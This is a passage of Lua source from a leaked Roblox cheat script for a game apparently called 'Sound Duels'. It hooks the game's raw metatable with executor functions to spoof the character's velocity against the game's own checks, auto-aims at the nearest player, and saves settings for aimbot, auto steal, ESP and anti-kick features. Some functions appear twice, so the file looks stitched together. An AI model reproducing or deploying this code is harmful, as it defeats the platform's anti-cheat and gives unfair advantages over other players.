    _G.SoundAntiE01Enabled = on == true
    _e01StopLoop()
    if _G.SoundAntiE01Enabled then
        _e01StartLoop()
    end
    if _G.SoundAntiE01Visual then pcall(_G.SoundAntiE01Visual, _G.SoundAntiE01Enabled) end
    if saveSoundConfig then pcall(saveSoundConfig) end
end

if _G.SoundAntiE01Enabled then
    task.defer(function()
        if _G.SoundSetAntiE01 then _G.SoundSetAntiE01(true) end
    end)
end


-- ==================== ANTI DROP ====================
_G.SoundAntiDropEnabled = _G.SoundAntiDropEnabled == true
local _antiDropActive = false
local _antiDropMt = nil
local _antiDropOldIdx = nil
local _antiDropOldNewIdx = nil
local _antiDropSpoofedVelocity = Vector3.zero

local function _exeStartAntiDrop()
    if _antiDropActive then return end
    local ok, mt = pcall(function()
        if type(getrawmetatable) ~= "function" then return nil end
        return getrawmetatable(game)
    end)
    if not ok or not mt then return end
    if type(setreadonly) ~= "function" or type(newcclosure) ~= "function" then return end
    if type(checkcaller) ~= "function" then return end

    _antiDropMt = mt
    _antiDropOldIdx = mt.__index
    _antiDropOldNewIdx = mt.__newindex

    pcall(function() setreadonly(mt, false) end)

    mt.__index = newcclosure(function(self, key)
        if not checkcaller()
            and (key == "AssemblyLinearVelocity" or key == "Velocity")
            and typeof(self) == "Instance"
            and self:IsA("BasePart")
            and self.Name == "HumanoidRootPart"
            and LP.Character
            and self:IsDescendantOf(LP.Character)
        then
            return _antiDropSpoofedVelocity
        end
        return _antiDropOldIdx(self, key)
    end)

    mt.__newindex = newcclosure(function(self, key, value)
        if not checkcaller()
            and (key == "AssemblyLinearVelocity" or key == "Velocity")
            and typeof(self) == "Instance"
            and self:IsA("BasePart")
            and self.Name == "HumanoidRootPart"
            and LP.Character
            and self:IsDescendantOf(LP.Character)
        then
            _antiDropSpoofedVelocity = value
            return
        end
        return _antiDropOldNewIdx(self, key, value)
    end)

    pcall(function() setreadonly(mt, true) end)
    _antiDropActive = true
end

local function _exeStopAntiDrop()
    if not _antiDropActive then return end
    if _antiDropMt and _antiDropOldIdx then
        pcall(function()
            setreadonly(_antiDropMt, false)
            _antiDropMt.__index = _antiDropOldIdx
            _antiDropMt.__newindex = _antiDropOldNewIdx
            setreadonly(_antiDropMt, true)
        end)
        _antiDropOldIdx = nil
        _antiDropOldNewIdx = nil
        _antiDropMt = nil
    end
    _antiDropActive = false
end

function _G.SoundSetAntiDrop(on)
    _G.SoundAntiDropEnabled = on == true
    -- Always stop first so re-execute / re-toggle rehooks cleanly
    _exeStopAntiDrop()
    if _G.SoundAntiDropEnabled then
        _exeStartAntiDrop()
    end
    if _G.SoundAntiDropVisual then pcall(_G.SoundAntiDropVisual, _G.SoundAntiDropEnabled) end
    if saveSoundConfig then pcall(saveSoundConfig) end
end

if _G.SoundAntiDropEnabled then
    task.defer(function()
        if _G.SoundSetAntiDrop then _G.SoundSetAntiDrop(true) end
    end)
end

_G.SoundHeadlessEnabled = _G.SoundHeadlessEnabled == true
_G.SoundKorbloxEnabled = _G.SoundKorbloxEnabled == true
_G.SoundHeadlessMeshId = "rbxassetid://1095708"
_G.SoundKorbloxMeshId = "rbxassetid://101851696"
_G.SoundKorbloxTextureId = "rbxassetid://101851254"

function _G.SoundApplyHeadless(char, enabled)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if enabled then
        head.Transparency = 1
        head.CanCollide = false
        local face = head:FindFirstChild("face")
        if face then face:Destroy() end

        local old = head:FindFirstChild("SoundHeadlessMesh")
        if old then old:Destroy() end

        local mesh = Instance.new("SpecialMesh")
        mesh.Name = "SoundHeadlessMesh"
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = _G.SoundHeadlessMeshId
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Parent = head
    else
        head.Transparency = 0
        head.CanCollide = true
        local old = head:FindFirstChild("SoundHeadlessMesh")
        if old then old:Destroy() end
    end
end

function _G.SoundApplyKorblox(char, enabled)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    if hum.RigType == Enum.HumanoidRigType.R6 then
        local leg = char:FindFirstChild("Right Leg")
        if not leg then return end

        local old = leg:FindFirstChild("SoundKorbloxMesh")
        if old then old:Destroy() end

        if enabled then
            leg.Color = Color3.fromRGB(64,64,64)
            local mesh = Instance.new("SpecialMesh")
            mesh.Name = "SoundKorbloxMesh"
            mesh.MeshType = Enum.MeshType.FileMesh
            mesh.MeshId = _G.SoundKorbloxMeshId
            mesh.TextureId = _G.SoundKorbloxTextureId
            mesh.Scale = Vector3.new(1,1,1)
            mesh.Parent = leg
        else
            leg.Color = Color3.fromRGB(255,255,255)
        end
    else
        local upper = char:FindFirstChild("RightUpperLeg")
        local lower = char:FindFirstChild("RightLowerLeg")
        local foot = char:FindFirstChild("RightFoot")
        if not upper then return end

        local oldLeg = char:FindFirstChild("SoundKorbloxLeg")
        if oldLeg then oldLeg:Destroy() end

        if enabled then
            upper.Transparency = 1
            if lower then lower.Transparency = 1 end
            if foot then foot.Transparency = 1 end

            local kleg = Instance.new("Part")
            kleg.Name = "SoundKorbloxLeg"
            kleg.Size = Vector3.new(1,2,1)
            kleg.Anchored = false
            kleg.CanCollide = false
            kleg.Massless = true
            kleg.Color = Color3.fromRGB(64,64,64)
            kleg.Parent = char

            local mesh = Instance.new("SpecialMesh")
            mesh.Name = "SoundKorbloxMesh"
            mesh.MeshType = Enum.MeshType.FileMesh
            mesh.MeshId = _G.SoundKorbloxMeshId
            mesh.TextureId = _G.SoundKorbloxTextureId
            mesh.Scale = Vector3.new(1,1,1)
            mesh.Parent = kleg

            local weld = Instance.new("Weld")
            weld.Name = "SoundKorbloxWeld"
            weld.Part0 = upper
            weld.Part1 = kleg
            weld.C0 = CFrame.new(0,-0.8,0)
            weld.Parent = kleg
        else
            upper.Transparency = 0
            if lower then lower.Transparency = 0 end
            if foot then foot.Transparency = 0 end
        end
    end
end

function _G.SoundApplyCharacterVisuals(char)
    char = char or LP.Character
    if not char then return end
    pcall(function() _G.SoundApplyHeadless(char, _G.SoundHeadlessEnabled) end)
    pcall(function() _G.SoundApplyKorblox(char, _G.SoundKorbloxEnabled) end)
end




_G.SoundBodyLockEnabled = _G.SoundBodyLockEnabled == true
_G.SoundBodyLockRadius = tonumber(_G.SoundBodyLockRadius) or 60
_G.SoundBodyLockConn = _G.SoundBodyLockConn or nil

function _G.SoundGetNearestBodyLockTarget()
local character = LP.Character
local root = character and character:FindFirstChild("HumanoidRootPart")
if not root then return nil end

local nearest = nil
local shortest = math.huge

for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
local tr = plr.Character:FindFirstChild("HumanoidRootPart")
local hum = plr.Character:FindFirstChildOfClass("Humanoid")
if tr and hum and hum.Health > 0 then
local d = (tr.Position - root.Position).Magnitude
if d <= (_G.SoundBodyLockRadius or 60) and d < shortest then
shortest = d
nearest = plr
end
end
end
end

return nearest
end

function _G.SoundStartBodyLock()
if _G.SoundBodyLockConn then return end
_G.SoundBodyLockEnabled = true

_G.SoundBodyLockConn = RunService.Heartbeat:Connect(function()
if not _G.SoundBodyLockEnabled then return end

local character = LP.Character
local myRoot = character and character:FindFirstChild("HumanoidRootPart")
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not myRoot or not humanoid or humanoid.Health <= 0 then return end

local target = _G.SoundGetNearestBodyLockTarget()
if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
local targetPos = target.Character.HumanoidRootPart.Position
local myPos = myRoot.Position
local offset = Vector3.new(targetPos.X, myPos.Y, targetPos.Z) - myPos

if offset.Magnitude > 0.1 then
humanoid.AutoRotate = false
local lookDir = offset.Unit
local currentDir = myRoot.CFrame.LookVector
local cross = currentDir:Cross(lookDir)
local currentVel = myRoot.AssemblyAngularVelocity
myRoot.AssemblyAngularVelocity = Vector3.new(currentVel.X, cross.Y * 40, currentVel.Z)
end
else
humanoid.AutoRotate = true
end
end)
end

function _G.SoundStopBodyLock()
_G.SoundBodyLockEnabled = false

if _G.SoundBodyLockConn then
pcall(function() _G.SoundBodyLockConn:Disconnect() end)
_G.SoundBodyLockConn = nil
end

local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
if hum then
hum.AutoRotate = true
end
end

function _G.SoundSetBodyLock(on)
_G.SoundBodyLockEnabled = on == true
if _G.SoundBodyLockEnabled then
_G.SoundStartBodyLock()
else
_G.SoundStopBodyLock()
end

if _G.SoundBodyLockVisual then
pcall(function() _G.SoundBodyLockVisual(_G.SoundBodyLockEnabled) end)
end
end

LP.CharacterAdded:Connect(function()
if _G.SoundBodyLockEnabled then
task.wait(0.3)
_G.SoundStopBodyLock()
_G.SoundStartBodyLock()
end
end)

local currentBackground = 0
local aceGuiScaleValue = SoundAutoMobile and 0.67 or 1.00
local aceProgressBarScaleValue = SoundAutoMobile and 0.83 or 1.00
CONFIG_FILE = "Sound Duels_MainGUI_Config_DefaultsV2.json"
KEYBINDS_CONFIG_FILE = "Sound Duels_Keybinds_DefaultsV2.json"
_ace_isfile = isfile or (syn and syn.isfile) or function(path)
local ok, result = pcall(function() return readfile(path) end)
return ok and result ~= nil
end
_ace_readfile = readfile or (syn and syn.readfile)
_ace_writefile = writefile or (syn and syn.writefile)
canSaveConfig = (type(_ace_readfile) == "function" and type(_ace_writefile) == "function")

selectedIntroMusic = selectedIntroMusic or 1
_introEnabled = false
setIntroVisual = nil
setIntroSongVisual = nil
INTRO_MUSIC_OPTIONS = INTRO_MUSIC_OPTIONS or {
{name="Song 1", url="https://files.catbox.moe/mzvrir.mp3", file="SoundDuelsIntroSong_1.mp3"},
{name="Song 2", url="https://files.catbox.moe/2a7jyx.mp3", file="SoundDuelsIntroSong_2.mp3"},
{name="Song 3", url="https://files.catbox.moe/rcgr9f.mp3", file="SoundDuelsIntroSong_3.mp3"},
{name="Song 4", url="https://files.catbox.moe/iknfuh.mp3", file="SoundDuelsIntroSong_4.mp3"},
{name="Song 5", url="https://files.catbox.moe/6eigoh.mp3", file="SoundDuelsIntroSong_5.mp3"},
{name="Song 6", url="https://files.catbox.moe/dvjtjk.mp3", file="SoundDuelsIntroSong_6.mp3"},
{name="Song 7", url="https://files.catbox.moe/iyw1cb.mp3", file="SoundDuelsIntroSong_7.mp3"},
}
function getIntroSongName()
local opt = INTRO_MUSIC_OPTIONS[selectedIntroMusic]
return opt and opt.name or "No Songs Added"
end
introPreviewSound = nil
introPlaybackSound = nil
introPreviewToken = 0
introPlaybackToken = 0
introSongCache = introSongCache or {}
introSongDownloading = introSongDownloading or {}
function stopIntroPreview()
introPreviewToken = introPreviewToken + 1
if introPreviewSound then
pcall(function() introPreviewSound:Stop() end)
pcall(function() introPreviewSound:Destroy() end)
introPreviewSound = nil
end
end
function stopIntroPlayback()
introPlaybackToken = introPlaybackToken + 1
if introPlaybackSound then
pcall(function() introPlaybackSound:Stop() end)
pcall(function() introPlaybackSound:Destroy() end)
introPlaybackSound = nil
end
end
function _safeNotify(msg)
if showActionNotification then pcall(function() showActionNotification(msg) end) end
end
function cacheIntroSong(option, allowDownload)
if not option or not option.url or option.url == "" then return nil end
if not (writefile and getcustomasset) then return nil end
local fileName = option.file or ("SoundDuelsIntroSong_" .. tostring(option.name or "song") .. ".mp3")
local function loadExisting()
if introSongCache[fileName] then return introSongCache[fileName] end
local hasFile = false
pcall(function() hasFile = isfile and isfile(fileName) end)
if hasFile then
local ok = pcall(function() introSongCache[fileName] = getcustomasset(fileName) end)
if ok and introSongCache[fileName] then return introSongCache[fileName] end
end
return nil
end
local cached = loadExisting()
if cached then return cached end
if allowDownload == false then return nil end
if introSongDownloading[fileName] then
local waitStart = tick()
while introSongDownloading[fileName] and tick() - waitStart < 12 do task.wait(0.05) end
cached = loadExisting()
if cached then return cached end
end
introSongDownloading[fileName] = true
local ok = pcall(function()
local data = game:HttpGet(option.url)
if data and #data > 0 then
writefile(fileName, data)
introSongCache[fileName] = getcustomasset(fileName)
end
end)
introSongDownloading[fileName] = nil
if ok and introSongCache[fileName] then return introSongCache[fileName] end
return loadExisting()
end
function preloadIntroSongs()
-- intro songs disabled
end

--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
ADAPT_INTRO_MUSIC_OPTIONS = {
    {name="Song 1", file="SoundIntroMusic_gm9wuu.mp3"},
    {name="Song 2", file="SoundIntroMusic_s2epvz.mp3"},
    {name="Song 3", file="SoundIntroMusic_w8vxqg.mp3"},
    {name="Song 4", file="SoundIntroMusic_y02ovb.mp3"},
    {name="Harun be ging", file="Harun_be_ging.mp3"},
}

if not ADAPT_INTRO_MUSIC_OPTIONS[selectedIntroMusic] then
    selectedIntroMusic = 1
end

local function getSoundIntroAssetLoader()
    if type(getcustomasset) == "function" then return getcustomasset end
    if type(getexecutorasset) == "function" then return getexecutorasset end
    if type(getsynasset) == "function" then return getsynasset end
    if syn and type(syn.getcustomasset) == "function" then return syn.getcustomasset end
    if syn and type(syn.getsynasset) == "function" then return syn.getsynasset end
    return nil
end

local function resolveSoundIntroSong(index)
    local option = ADAPT_INTRO_MUSIC_OPTIONS[index]
    if not option then return nil end

    local loader = getSoundIntroAssetLoader()
    if not loader then return nil end

    if type(isfile) == "function" then
        local okExists, exists = pcall(isfile, option.file)
        if okExists and not exists then return nil end
    end

    local ok, asset = pcall(loader, option.file)
    if ok and asset and tostring(asset) ~= "" then
        return asset
    end
    return nil
end

function getIntroSongName()
    local opt = ADAPT_INTRO_MUSIC_OPTIONS[selectedIntroMusic]
    return opt and opt.name or "Song 1"
end

--Leaked By Xlu0 AndPrime--
function stopIntroPreview()
    introPreviewToken = (introPreviewToken or 0) + 1
    if introPreviewSound then
        pcall(function() introPreviewSound:Stop() end)
        pcall(function() introPreviewSound:Destroy() end)
        introPreviewSound = nil
    end
end

function stopIntroPlayback()
    introPlaybackToken = (introPlaybackToken or 0) + 1
    if introPlaybackSound then
        pcall(function() introPlaybackSound:Stop() end)
        pcall(function() introPlaybackSound:Destroy() end)
        introPlaybackSound = nil
    end
end

function previewIntroMusic(index)
    stopIntroPreview()
    stopIntroPlayback()

    index = tonumber(index) or selectedIntroMusic or 1
    if not ADAPT_INTRO_MUSIC_OPTIONS[index] then index = 1 end

    local token = introPreviewToken
    task.spawn(function()
        local soundId = resolveSoundIntroSong(index)
        if token ~= introPreviewToken then return end

        if not soundId then
            if showActionNotification then
                pcall(function() showActionNotification("INTRO MUSIC FILE NOT FOUND") end)
            end
            return
        end

        local sound = Instance.new("Sound")
        sound.Name = "SoundIntroPreview_" .. tostring(index)
        sound.SoundId = soundId
        sound.Volume = 0.65
        sound.Looped = false
        sound.Parent = SoundService
        introPreviewSound = sound

        sound.TimePosition = 0
        pcall(function() sound:Play() end)

        task.delay(10, function()
            if token == introPreviewToken then
                stopIntroPreview()
            end
        end)
    end)
end

function playIntroMusic()
    stopIntroPreview()
    stopIntroPlayback()
    -- intro disabled
end

-- intro song preload disabled
function makeIntroSoundFromId(soundId, name, parent)
if not soundId then return nil end
local sound = Instance.new("Sound")
sound.Name = name or "SoundDuelsIntroMusic"
sound.Volume = 0.65
sound.Looped = false
sound.SoundId = soundId
sound.Parent = parent or SoundService
return sound
end
function createIntroSound(option, fileName, parent, allowDownload)
if not option then return nil end
local soundId = cacheIntroSong(option, allowDownload)
if not soundId then return nil end
return makeIntroSoundFromId(soundId, fileName, parent)
end
function previewIntroMusic(index)
stopIntroPreview()
stopIntroPlayback()
if not INTRO_MUSIC_OPTIONS[index] then _safeNotify("ADD SONG LINKS"); return end
local token = introPreviewToken
task.spawn(function()
local option = INTRO_MUSIC_OPTIONS[index]
local sound = createIntroSound(option, "SoundDuelsIntroPreview_" .. tostring(token), SoundService, true)
if token ~= introPreviewToken then if sound then sound:Destroy() end; return end
introPreviewSound = sound
if not sound then _safeNotify("SONG LOADING..."); return end
sound.TimePosition = 0
pcall(function() sound:Play() end)
task.delay(15, function() if token == introPreviewToken then stopIntroPreview() end end)
end)
end
function playIntroMusic()
stopIntroPreview()
stopIntroPlayback()
-- intro disabled
end
-- preloadIntroSongs() disabled

savedConfig = {}
_G.SoundGuiLocked = _G.SoundGuiLocked == true
_G.SoundHiddenMobileButtons = type(_G.SoundHiddenMobileButtons) == "table" and _G.SoundHiddenMobileButtons or {}
if _G.SoundHideMobileButtons == nil then
_G.SoundHideMobileButtons = not SoundAutoMobile
else
_G.SoundHideMobileButtons = _G.SoundHideMobileButtons == true
_G.SoundMobileButtonScale = tonumber(_G.SoundMobileButtonScale) or 0.75
end
_G.SoundMobileButtonScale = tonumber(_G.SoundMobileButtonScale) or (SoundAutoMobile and 0.90 or 1.00)
_G.SoundMobileButtonPositions = _G.SoundMobileButtonPositions or {}
_G.SoundMobileButtonImage = _G.SoundMobileButtonImage or "rbxassetid://110350353403289"
_G.SoundMobileButtonShape = _G.SoundMobileButtonShape or "ROUNDED"
_G.SoundStealUIImage = _G.SoundStealUIImage or ""
savedMainPositionTable = nil
savedMiniPositionTable = nil
function udim2ToTable(u)
return {xs = u.X.Scale, xo = u.X.Offset, ys = u.Y.Scale, yo = u.Y.Offset}
end
function tableToUDim2(t, fallback)
if type(t) == "table" then
return UDim2.new(tonumber(t.xs) or 0, tonumber(t.xo) or 0, tonumber(t.ys) or 0, tonumber(t.yo) or 0)
end
return fallback
end
function collectSoundMobileButtonPositions()
local out = {}
for key, entry in pairs(_G.SoundMobileButtonRefs or {}) do
local holder = entry and entry.holder
if holder then out[key] = udim2ToTable(holder.Position) end
end
if next(out) == nil and type(_G.SoundMobileButtonPositions) == "table" then
return _G.SoundMobileButtonPositions
end
_G.SoundMobileButtonPositions = out
return out
end
-- layout v3: AUTO LEFT/RIGHT above DROP/AIMBOT; laggers under TP/CARRY
_G.SoundMobileLayoutV = _G.SoundMobileLayoutV or 0
if _G.SoundMobileLayoutV < 6 then
    _G.SoundMobileLayoutV = 6
    _G.SoundMobileButtonPositions = {}
end
function getSavedMobileButtonPosition(key, fallback)
if type(_G.SoundMobileButtonPositions) == "table" then
local t = _G.SoundMobileButtonPositions[key]
if type(t) == "table" then
return tableToUDim2(t, fallback)
end
end
return fallback
end
function saveMobileButtonPosition(key, pos)
if not key then return end
_G.SoundMobileButtonPositions = _G.SoundMobileButtonPositions or {}
_G.SoundMobileButtonPositions[key] = udim2ToTable(pos)
if type(saveSoundConfig) == "function" then
pcall(saveSoundConfig)
end
end
function keyToString(key)
if not key then return "None" end
return tostring(key):gsub("Enum.KeyCode.", "")
end
function stringToKeyCode(value)
if type(value) ~= "string" or value == "" or value == "None" then return nil end
return Enum.KeyCode[value]
end
function keybindsToTable()
local out = {}
for keyId in pairs(DEFAULT_SPEED_KEYBINDS) do
out[keyId] = keyToString(speedKeybinds[keyId])
end
for keyId, key in pairs(speedKeybinds) do
out[keyId] = keyToString(key)
end
return out
end
function collectSoundKeybindConfig()
return {
keybinds = keybindsToTable(),
tpDownKeybind = keyToString(tpDownKeybind),
}
end
function applySavedKeybinds(t)
if type(t) ~= "table" then return end
for keyId in pairs(speedKeybinds) do
if t[keyId] ~= nil then
speedKeybinds[keyId] = stringToKeyCode(t[keyId])
end
end
end
function applyDefaultSoundKeybinds()
for keyId, key in pairs(DEFAULT_SPEED_KEYBINDS) do
speedKeybinds[keyId] = key
end
tpDownKeybind = DEFAULT_TP_DOWN_KEYBIND
end
function collectSoundConfig()
return {
mainPosition = savedMainPositionTable,
keybinds = keybindsToTable(),
tpDownKeybind = keyToString(tpDownKeybind),
NS = NS,
CS = CS,
LAGGER_SPEED = LAGGER_SPEED,
LAGGER_CARRY_SPEED = LAGGER_CARRY_SPEED,
currentSpeedMode = currentSpeedMode,
dropMode = _G.SoundDropMode,
autoCarrySpeedEnabled = autoCarrySpeedEnabled == true,
autoTPEnabled = autoTPEnabled,
autoTPHeight = autoTPHeight,
infJumpEnabled = infJumpEnabled,
infJumpMode = _G.SoundInfJumpMode,
antiRagdollEnabled = antiRagdollEnabled,
antiRagdollMode = _G.SoundAntiRagdollMode,
antiVoidEnabled = _G.SoundAntiVoidEnabled == true,
antiResetEnabled = _G.SoundAntiResetEnabled == true,
antiE01Enabled = _G.SoundAntiE01Enabled == true,
antiDropEnabled = _G.SoundAntiDropEnabled == true,
selectedAnimationPack = selectedAnimationPack,
selectedMoreAnimationBundle = _G.SoundSelectedMoreAnimationBundle,
selectedStealMode = selectedStealMode,
autoStealEnabled = autoStealEnabled,
autoStealRadius = autoStealRadius,
aceStealRadii = _G.SoundStealRadii,
selectedAimbotMode = selectedAimbotMode,
AIMBOT_SPEED = AIMBOT_SPEED,
LAGGER_AIMBOT_SPEED = LAGGER_AIMBOT_SPEED,
ANTI_BYPASS_AIMBOT_SPEED = _G.SoundAntiBypassAimbotSpeed,
ANTI_BYPASS_LAGGER_AIMBOT_SPEED = _G.SoundAntiBypassLaggerAimbotSpeed,
ANTI_DESYNC_AIMBOT_SPEED = ANTI_DESYNC_AIMBOT_SPEED,
autoSwingEnabled = autoSwingEnabled,
mirrorTPDownEnabled = mirrorTPDownEnabled,
normalAimbotEnabled = _G.SoundNormalAimbotOn == true,
antiBypassAimbotEnabled = _G.SoundAntiBypassAimbotOn == true,
antiDesyncAutoSwingEnabled = antiDesyncAutoSwingEnabled,
antiDesyncAimbotEnabled = _G.SoundAntiDesyncAimbotOn == true,
antiTpBatEnabled = _G.SoundAntiTpBatEnabled == true,
batCounterEnabled = batCounterEnabled,
medCounterEnabled = medCounterEnabled,
hardHitEnabled = hardHitEnabled == true,
hardHitRadius = tonumber(hardHitRadius) or 10,
perfectHitEnabled = perfectHitEnabled == true,
perfectHitRange = tonumber(perfectHitRange) or 175,
safeMode = antiKickEnabled == true,
autoResetOnMedEnabled = autoResetOnMedEnabled,
espEnabled = espEnabled,
espLineEnabled = espLineEnabled == true,
showTracerEnabled = showTracerEnabled,
ragdollCountdownEnabled = ragdollCountdownEnabled,
fpsBoostEnabled = fpsBoostEnabled,
antiLagVisualEnabled = antiLagVisualEnabled,
nukeOptimiserEnabled = nukeOptimiserEnabled,
fovEnabled = fovEnabled,
fovValue = fovValue,
noCamCollisionEnabled = noCamCollisionEnabled,
noPlayerCollisionEnabled = _G.SoundNoPlayerCollisionEnabled,
customFontVisualEnabled = (_G.SoundCustomFontSelected or "None") ~= "None",
customFontSelected = _G.SoundCustomFontSelected or "None",
skyTheme = skyTheme,
autoLeftEnabled = autoLeftEnabled,
autoRightEnabled = autoRightEnabled,
currentBackground = currentBackground,
bodyLockEnabled = _G.SoundBodyLockEnabled == true,
bodyLockRadius = tonumber(_G.SoundBodyLockRadius) or 60,
mobileButtonScale = tonumber(_G.SoundMobileButtonScale) or 0.75,
guiScaleValue = tonumber(_G.SoundGuiScaleValue) or tonumber(adaptGuiScaleValue) or tonumber(aceGuiScaleValue) or 0.52,
stealUiScaleValue = tonumber(_G.SoundProgressBarScaleValue) or tonumber(aceProgressBarScaleValue) or 0.83,
headlessEnabled = _G.SoundHeadlessEnabled == true,
korbloxEnabled = _G.SoundKorbloxEnabled == true,
currentThemeName = "WHITE",
aceGuiScaleValue = aceGuiScaleValue,
aceProgressBarScaleValue = aceProgressBarScaleValue,
introEnabled = _introEnabled == true,
selectedIntroMusic = selectedIntroMusic,
guiLocked = _G.SoundGuiLocked == true,
stealBarPosition = _G.SoundStealBarPosition,
miniPosition = savedMiniPositionTable,
hideMobileButtons = _G.SoundHideMobileButtons == true,
hiddenMobileButtons = (function() local t = {} for k, v in pairs(_G.SoundHiddenMobileButtons or {}) do if v == true then t[#t + 1] = tostring(k) end end return t end)(),
aceMobileButtonScale = _G.SoundMobileButtonScale,
mobileButtonPositions = collectSoundMobileButtonPositions(),
mobileButtonImage = _G.SoundMobileButtonImage or "",
mobileButtonShape = _G.SoundMobileButtonShape or "ROUNDED",
stealUIImage = _G.SoundStealUIImage or "",
autoStealV3Radius = tonumber((_G.SoundStealRadii and _G.SoundStealRadii["Auto Steal V3"]) or autoStealRadius) or 63,
aceStealRadii = {
    ["Auto Steal V3"] = tonumber((_G.SoundStealRadii and _G.SoundStealRadii["Auto Steal V3"]) or autoStealRadius) or 63,
    Semi = tonumber((_G.SoundStealRadii and _G.SoundStealRadii.Semi) or 9) or 9,
},
duelMode = _G.SoundDuelMode or "half",
autoMoveSpeed = tonumber(_G.SoundAutoMoveSpeed) or 60,
autoMoveCarrySpeed = tonumber(_G.SoundAutoMoveCarrySpeed) or 30,
stretchValue = tonumber(_G.SoundStretchValue) or 0.7,
stretchPreset = _G.SoundStretchPreset or "Medium",
avatarChangerUserId = (_G.SoundAvatarChangerCleared and 0) or ((_G.SoundAvatarChangerState and _G.SoundAvatarChangerState.lastUserId) or 0),
avatarChangerUsername = (_G.SoundAvatarChangerCleared and "") or ((_G.SoundAvatarChangerState and _G.SoundAvatarChangerState.lastUsername) or ""),
}
end
function saveSoundConfig()
if not canSaveConfig then return end
pcall(function()
_ace_writefile(CONFIG_FILE, HttpService:JSONEncode(collectSoundConfig()))
_ace_writefile(KEYBINDS_CONFIG_FILE, HttpService:JSONEncode(collectSoundKeybindConfig()))
end)
end
function loadSoundConfig()
_G.SoundManualSaveConfig = saveSoundConfig
if _G.SoundGuiScaleValue then
pcall(function()
if adaptGuiScaleValue ~= nil then adaptGuiScaleValue = tonumber(_G.SoundGuiScaleValue) or adaptGuiScaleValue end
if aceGuiScaleValue ~= nil then aceGuiScaleValue = tonumber(_G.SoundGuiScaleValue) or aceGuiScaleValue end
end)
end
if _G.SoundProgressBarScaleValue then
pcall(function()
if adaptProgressBarScaleValue ~= nil then adaptProgressBarScaleValue = tonumber(_G.SoundProgressBarScaleValue) or adaptProgressBarScaleValue end
if aceProgressBarScaleValue ~= nil then aceProgressBarScaleValue = tonumber(_G.SoundProgressBarScaleValue) or aceProgressBarScaleValue end
end)
end
if not canSaveConfig or not _ace_isfile(CONFIG_FILE) then return end
local ok, data = pcall(function()
return HttpService:JSONDecode(_ace_readfile(CONFIG_FILE))
end)
if not ok or type(data) ~= "table" then return end
savedConfig = data
local keybindData = data
pcall(function()
if _ace_isfile(KEYBINDS_CONFIG_FILE) then
local kb = HttpService:JSONDecode(_ace_readfile(KEYBINDS_CONFIG_FILE))
if type(kb) == "table" then keybindData = kb end
end
end)
savedMainPositionTable = data.mainPosition
savedMiniPositionTable = data.miniPosition or nil
_G.SoundGuiLocked = data.guiLocked == true
if type(data.stealBarPosition) == "table" then _G.SoundStealBarPosition = data.stealBarPosition end
if data.hideMobileButtons ~= nil then
_G.SoundHideMobileButtons = data.hideMobileButtons == true
elseif _G.SoundHideMobileButtons == nil then
_G.SoundHideMobileButtons = not SoundAutoMobile
end
_G.SoundMobileButtonScale = tonumber(data.mobileButtonScale) or (SoundAutoMobile and 0.90 or 1.00)
_G.SoundHiddenMobileButtons = {}
if type(data.hiddenMobileButtons) == "table" then
    for _, k in ipairs(data.hiddenMobileButtons) do
        _G.SoundHiddenMobileButtons[tostring(k)] = true
    end
end
_G.SoundMobileButtonPositions = {}
if type(data.mobileButtonPositions) == "table" then
    for k, v in pairs(data.mobileButtonPositions) do
        if type(v) == "table" then
            _G.SoundMobileButtonPositions[tostring(k)] = v
        end
    end
end
_G.SoundMobileButtonImage = tostring(data.mobileButtonImage or "")
_G.SoundMobileButtonShape = tostring(data.mobileButtonShape or "ROUNDED"):upper()
if _G.SoundMobileButtonShape ~= "CIRCLE" and _G.SoundMobileButtonShape ~= "SQUARE" and _G.SoundMobileButtonShape ~= "ROUNDED" then
_G.SoundMobileButtonShape = "ROUNDED"
end
_G.SoundStealUIImage = tostring(data.stealUIImage or "")
if data.autoStealV3Radius ~= nil then
    _G.SoundStealRadii = _G.SoundStealRadii or {}
    _G.SoundStealRadii["Auto Steal V3"] = tonumber(data.autoStealV3Radius) or 63
    if selectedStealMode == "Auto Steal V3" then
        autoStealRadius = _G.SoundStealRadii["Auto Steal V3"]
        if autoStealRadiusBox then
            autoStealRadiusBox.Text = tostring(autoStealRadius)
        end
    end
end

_G.SoundDuelMode = (tostring(data.duelMode or "half") == "full") and "full" or "half"
_G.SoundAutoMoveSpeed = tonumber(data.autoMoveSpeed) or _G.SoundAutoMoveSpeed or 60
_G.SoundAutoMoveCarrySpeed = tonumber(data.autoMoveCarrySpeed) or _G.SoundAutoMoveCarrySpeed or 30
_G.SoundStretchValue = tonumber(data.stretchValue) or _G.SoundStretchValue or 0.7
_G.SoundStretchPreset = tostring(data.stretchPreset or _G.SoundStretchPreset or "Medium")
_G.SoundSavedAvatarChangerUserId = tonumber(data.avatarChangerUserId)
if _G.SoundSavedAvatarChangerUserId == 0 then _G.SoundSavedAvatarChangerUserId = nil; _G.SoundAvatarChangerCleared = true else _G.SoundAvatarChangerCleared = false end
_G.SoundSavedAvatarChangerUsername = tostring(data.avatarChangerUsername or "")
applySavedKeybinds(keybindData.keybinds)
if keybindData.tpDownKeybind ~= nil then
if tostring(keybindData.tpDownKeybind) == "None" then
tpDownKeybind = nil
else
tpDownKeybind = stringToKeyCode(keybindData.tpDownKeybind) or DEFAULT_TP_DOWN_KEYBIND
end
end
for keyId, defaultKey in pairs(DEFAULT_SPEED_KEYBINDS) do
local savedKeys = keybindData and keybindData.keybinds
if (not savedKeys or savedKeys[keyId] == nil) and speedKeybinds[keyId] == nil then
speedKeybinds[keyId] = defaultKey
end
end
NS = tonumber(data.NS) or NS
CS = tonumber(data.CS) or CS
LAGGER_SPEED = tonumber(data.LAGGER_SPEED) or LAGGER_SPEED
LAGGER_CARRY_SPEED = tonumber(data.LAGGER_CARRY_SPEED) or LAGGER_CARRY_SPEED
currentSpeedMode = data.currentSpeedMode or currentSpeedMode
carrySpeedActive = (currentSpeedMode == "Carry")
laggerModeEnabled = (currentSpeedMode == "Lagger")
